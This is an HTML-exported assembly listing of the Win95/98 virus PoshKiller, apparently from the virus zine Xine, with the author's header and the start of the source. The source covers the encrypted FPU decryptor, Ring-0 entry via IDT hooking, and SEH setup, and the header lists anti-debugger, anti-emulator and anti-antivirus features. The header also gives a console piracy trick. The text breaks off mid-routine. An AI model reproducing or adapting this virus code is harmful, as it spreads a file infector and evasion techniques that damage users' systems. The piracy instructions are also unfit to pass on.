<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 209 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">; [Win95.PoshKiller] - Ring-0 resident PE infector</span><span class="sc0">
</span><span class="sc1">; Copyright (c) 1999 by Billy Belcebu/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Virus Name    : PoshKiller</span><span class="sc0">
</span><span class="sc1">; Virus Author  : Billy Belcebu/iKX</span><span class="sc0">
</span><span class="sc1">; Origin        : Spain</span><span class="sc0">
</span><span class="sc1">; Platform      : Win95/98</span><span class="sc0">
</span><span class="sc1">; Target        : PE files (EXE,SCR,CPL)</span><span class="sc0">
</span><span class="sc1">; Compiling     : TASM 5.0 and TLINK 5.0 should be used</span><span class="sc0">
</span><span class="sc1">;                       tasm32 /ml /m3 poshkill,,;</span><span class="sc0">
</span><span class="sc1">;                       tlink32 /Tpe /aa /c /v poshkill,poshkill,,import32.lib,</span><span class="sc0">
</span><span class="sc1">;                       pewrsec poshkill.exe</span><span class="sc0">
</span><span class="sc1">; Features      : Well, here goes the list of what does this virus:</span><span class="sc0">
</span><span class="sc1">;                 ù Ring-0 virus by means of modifying the IDT.</span><span class="sc0">
</span><span class="sc1">;                 ù Win9X resident encrypted PE infector (EXE/SCR/CPL).</span><span class="sc0">
</span><span class="sc1">;                 ù Anti-emulators (FPU in decryptor, make fake GPFs).</span><span class="sc0">
</span><span class="sc1">;                 ù Anti-debugger (SEH, Anti-SoftICE, INT 3).</span><span class="sc0">
</span><span class="sc1">;                 ù Anti-monitors (with Super's kinda tunneling trick).</span><span class="sc0">
</span><span class="sc1">;                 ù Anti-heuristics (not detected by AVP32,NODICE32,etc).</span><span class="sc0">
</span><span class="sc1">;                 ù Infects on open, rename and in attribute change.</span><span class="sc0">
</span><span class="sc1">;                 ù Used Pentium instructions.</span><span class="sc0">
</span><span class="sc1">;                 ù Graphical payload, thanx to the p0rt g0d nIgr0 :)</span><span class="sc0">
</span><span class="sc1">; Payload       : The  first  graphical  payload  FULL WORKING in Ring-0, coz</span><span class="sc0">
</span><span class="sc1">;                 it uses ports for perform its action. It scrolls the screen</span><span class="sc0">
</span><span class="sc1">;                 contents from right to left. The payload was coded with the</span><span class="sc0">
</span><span class="sc1">;                 knowledge, ideas and presence of nIgr0.</span><span class="sc0">
</span><span class="sc1">; Notes         : Well, about the name of the virus, i think it's quite clear</span><span class="sc0">
</span><span class="sc1">;                 I hate those  poshes, their  attitude, their world slave of</span><span class="sc0">
</span><span class="sc1">;                 capitalism, slave of the  fascism of the fashion, trying to</span><span class="sc0">
</span><span class="sc1">;                 keep being the beautiful people... There  are MANY of those</span><span class="sc0">
</span><span class="sc1">;                 around my life, but i try to be isolated from them, i don't</span><span class="sc0">
</span><span class="sc1">;                 want to be as sick as them :) But, at  least, let me say an</span><span class="sc0">
</span><span class="sc1">;                 existencial  question that  hurts  me... Why the posh girls</span><span class="sc0">
</span><span class="sc1">;                 are the preetiest  girls around? Hehehe, i ask this because</span><span class="sc0">
</span><span class="sc1">;                 it is a constant in  my life: i know some impressive preety</span><span class="sc0">
</span><span class="sc1">;                 girls, and ALL them are really (and sadly) posh.</span><span class="sc0">
</span><span class="sc1">;                 Well, the worst is when a posh is also  catholic, but  this</span><span class="sc0">
</span><span class="sc1">;                 is another  history... I also  know some  of them (boys and</span><span class="sc0">
</span><span class="sc1">;                 girls), and they hate me as i hate'em. Nice, heh? :)</span><span class="sc0">
</span><span class="sc1">; Miscellaneous : VERY INTERESTING! :) If  some of  you have a PlayStation (i</span><span class="sc0">
</span><span class="sc1">;                 know many people that waste their time playing with it, but</span><span class="sc0">
</span><span class="sc1">;                 anyway...), and you want to use pirate games, and you don't</span><span class="sc0">
</span><span class="sc1">;                 trust in anyone for put the goddamn multisystem chip, there</span><span class="sc0">
</span><span class="sc1">;                 is a trick for use the pirate  games without installing the</span><span class="sc0">
</span><span class="sc1">;                 chip. You'll need, of  course, a playstation, and  at least</span><span class="sc0">
</span><span class="sc1">;                 one original  game (a demo  can be used too), and  a pirate</span><span class="sc0">
</span><span class="sc1">;                 game. Firstly, you must make your playstation to be able to</span><span class="sc0">
</span><span class="sc1">;                 keep opened the CD drive  while running games (this is done</span><span class="sc0">
</span><span class="sc1">;                 by a simple trick that most of you already know). Well, the</span><span class="sc0">
</span><span class="sc1">;                 trick consists in the following:</span><span class="sc0">
</span><span class="sc1">;                 1ø Put the original CD in its place, and you'll see how the</span><span class="sc0">
</span><span class="sc1">;                 playstation begins  to rotate it. But you will see that af-</span><span class="sc0">
</span><span class="sc1">;                 ter a few seconds, it slowdown  a little the rotation. Then</span><span class="sc0">
</span><span class="sc1">;                 you  must  substitute  the  original  CD by the pirate one.</span><span class="sc0">
</span><span class="sc1">;                 2ø Then you'll  see  how the pirate CD begins its rotation,</span><span class="sc0">
</span><span class="sc1">;                 and then, after a  few seconds you'll see that it slowdowns</span><span class="sc0">
</span><span class="sc1">;                 the rotation, and then substitute the pirate CD by the ori-</span><span class="sc0">
</span><span class="sc1">;                 ginal CD.</span><span class="sc0">
</span><span class="sc1">;                 3ø Now follows the hardest part. The original CD will begin</span><span class="sc0">
</span><span class="sc1">;                 it's rotation. And after 1 second  you'll hear a "clic" so-</span><span class="sc0">
</span><span class="sc1">;                 und. Now it's the moment. Substitute fastly the original CD</span><span class="sc0">
</span><span class="sc1">;                 with the pirate CD and... Voil…! :)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                 The horrible people, the horrible people</span><span class="sc0">
</span><span class="sc1">;               It's as anatomic as the size of your stepple</span><span class="sc0">
</span><span class="sc1">;                    Capitalism has made it this way</span><span class="sc0">
</span><span class="sc1">;                         Old fashioned fascism</span><span class="sc0">
</span><span class="sc1">;                         will take it away!!!!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                            -Marilyn Manson-</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Amunt ValŠncia!!! la copa Šs nostra!!! (26-6-99),</span><span class="sc0">
</span><span class="sc1">; Billy Belcebu/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Constants, data and another shit                                        ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

        </span><span class="sc2">.586p</span><span class="sc0">                                   </span><span class="sc1">; Really needed!</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">                            </span><span class="sc1">; Hehehe i love 32 bit stuph ;)</span><span class="sc0">

</span><span class="sc5">TRUE</span><span class="sc0">                            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0">                           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0">                           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">TRUE</span><span class="sc0">    </span><span class="sc1">; Oh my beloved SoftIce... :)</span><span class="sc0">

</span><span class="sc1">; VxD functions used</span><span class="sc0">

</span><span class="sc5">VMM_Get_DDB</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00010146h</span><span class="sc0">
</span><span class="sc5">IFSMgr_GetHeap</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040000Dh</span><span class="sc0">
</span><span class="sc5">IFSMgr_RetHeap</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0040000Eh</span><span class="sc0">
</span><span class="sc5">IFSMgr_Ring0_FileIO</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400032h</span><span class="sc0">
</span><span class="sc5">UniToBCSPath</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400041h</span><span class="sc0">
</span><span class="sc5">IFSMgr_InstallFileSystemApiHook</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00400067h</span><span class="sc0">

</span><span class="sc1">; IFSMgr_Ring0_FileIO functions used</span><span class="sc0">

</span><span class="sc5">R0_DELETEFILE</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04100h</span><span class="sc0">
</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04300h</span><span class="sc0">
</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D500h</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D700h</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0">                     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D600h</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D601h</span><span class="sc0">
</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0D800h</span><span class="sc0">

</span><span class="sc1">; FileSystem intercepted functions</span><span class="sc0">

</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">24h</span><span class="sc0">
</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">25h</span><span class="sc0">

</span><span class="sc1">; Constants of the virus</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">encrypt_size</span><span class="sc0">                    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">encrypt_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">size_to_allocate</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">virus_size</span><span class="sc4">+</span><span class="sc2">2048</span><span class="sc0">
</span><span class="sc5">section_flags</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">rva_key</span><span class="sc0">                         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KeyEnc</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">Interrupt</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">05h</span><span class="sc0"> 
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc5">Interrupt</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc1">; Let'z antidebug their arse</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">rdtcs</span><span class="sc0">                           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">310Fh</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc1">; Macro for make the VxD Calls required</span><span class="sc0">

</span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">VxDService</span><span class="sc0">
        </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">@@@@@@</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">20h</span><span class="sc0">                     </span><span class="sc1">; CD 20                 +00</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VxDService</span><span class="sc0">              </span><span class="sc1">; XX XX XX XX           +02</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@@@@@</span><span class="sc0">                  </span><span class="sc1">; EB 04                 +06</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">VxDService</span><span class="sc0">              </span><span class="sc1">; XX XX XX XX           +08</span><span class="sc0">
</span><span class="sc5">@@@@@@</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">; Sufrir s... ­PIJO DE MIERDA! El poder del metal... El castigo infernal...</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

        </span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">szTitle</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Win9X.PoshKiller."</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">1000</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">0100</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">0010</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">virus_size</span><span class="sc4">/</span><span class="sc2">0001</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc3">"0"</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">szMessage</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C'mon posh. I believe in myself and in anyone else,"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"while you believe in the capitalism; i innovate,"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"you copy; i live, you don't. Why? I killed you."</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Copyright (c) 1999 by Billy Belcebu/iKX"</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc1">; Mi vezino me atormenta, todo el dia en los 40, le ha soplado a mi vieja ke</span><span class="sc0">
</span><span class="sc1">; bebo mas de la kuenta... "Como le pille en la eskalera... ­me lo kargo a</span><span class="sc0">
</span><span class="sc1">; guitarrazos!"</span><span class="sc0">

        </span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">
</span><span class="sc1">; ³ Initialize virus, and get Ring-0 privilege                              ³</span><span class="sc0">
</span><span class="sc1">; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">poshkiller</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0">      </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">kutre_delta</span><span class="sc0">                     </span><span class="sc1">; 'sup? i don't like the </span><span class="sc0">
</span><span class="sc5">petakakas</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">; ussual method: AVP32 catches</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; it :)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">encrypt_size</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">; ECX = Encrypted size in DWORDS</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">overkey</span><span class="sc0">
</span><span class="sc5">KeyEnc</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TempByt</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">overkey</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                             </span><span class="sc1">; ESI = Pointer to enc. key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; EBX = Pointer to a temp dword</span><span class="sc0">

        </span><span class="sc7">finit</span><span class="sc0">                                   </span><span class="sc1">; Initialize math coprocessor</span><span class="sc0">

</span><span class="sc1">; Megafast FPU decryption!</span><span class="sc0">

</span><span class="sc5">eloop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Push the dword to decrypt</span><span class="sc0">
        </span><span class="sc7">fistp</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Pop in temporal address</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; Decrypt dword in that address</span><span class="sc0">
        </span><span class="sc7">fild</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Push decrypted integral</span><span class="sc0">
        </span><span class="sc7">fistp</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">; Store the decrypted integral</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; Actualize counter</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">eloop</span><span class="sc0">                           </span><span class="sc1">; Loop until all is decrypted</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">strip</span><span class="sc0">                           </span><span class="sc1">; And go over that shitty call</span><span class="sc0">

</span><span class="sc5">kutre_delta</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">; Shitty method for get</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">petakakas</span><span class="sc0">                       </span><span class="sc1">; inital address to decrypt</span><span class="sc0">

</span><span class="sc5">encrypt_start</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
        
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">" [IAIDA] "</span><span class="sc0">                    </span><span class="sc1">; Here she is! The girl with</span><span class="sc0">
                                                </span><span class="sc1">; the sweetest smile i've ever</span><span class="sc0">
                                                </span><span class="sc1">; know... also the best in</span><span class="sc0">
                                                </span><span class="sc1">; many other fields :)~</span><span class="sc0">

</span><span class="sc1">; Psch‚, quiz  si sea un babosillo :) Pero, joder, no la conoceis...</span><span class="sc0">
</span><span class="sc1">; (ni quiero que lo hagais mamones!!! Es m¡a y solo m¡a!!! X-DDD)</span><span class="sc0">

</span><span class="sc5">strip</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getdeltax</span><span class="sc0">                       </span><span class="sc1">; Ol' good days delta offset!</span><span class="sc0">
</span><span class="sc5">getdeltax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdeltax</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdeltax</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">poshkiller</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00001000h</span><span class="sc0">                   </span><span class="sc1">; Get imagebase at runtime</span><span class="sc0">
</span><span class="sc5">newEIP</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ibase</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetUpSEH</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; Restore stack if fault</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">restore_old_bytes</span><span class="sc0">               </span><span class="sc1">; Fix this shit</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DeactivateSEH</span><span class="sc0">
</span><span class="sc5">SetUpSEH</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; Setup SEH</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">; Interrupt table to stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,(</span><span class="sc5">Interrupt</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">; Get interrupt vector</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Grmffxzxmfmfmzmzxxxxggrrr...</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InterruptHandler</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Wheeeeehoooowww?</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">                          </span><span class="sc1">; Move MSW to LSW</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc5">Interrupt</span><span class="sc0">                       </span><span class="sc1">; Ring-0 jump!</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; Restore old interrupt values</span><span class="sc0">
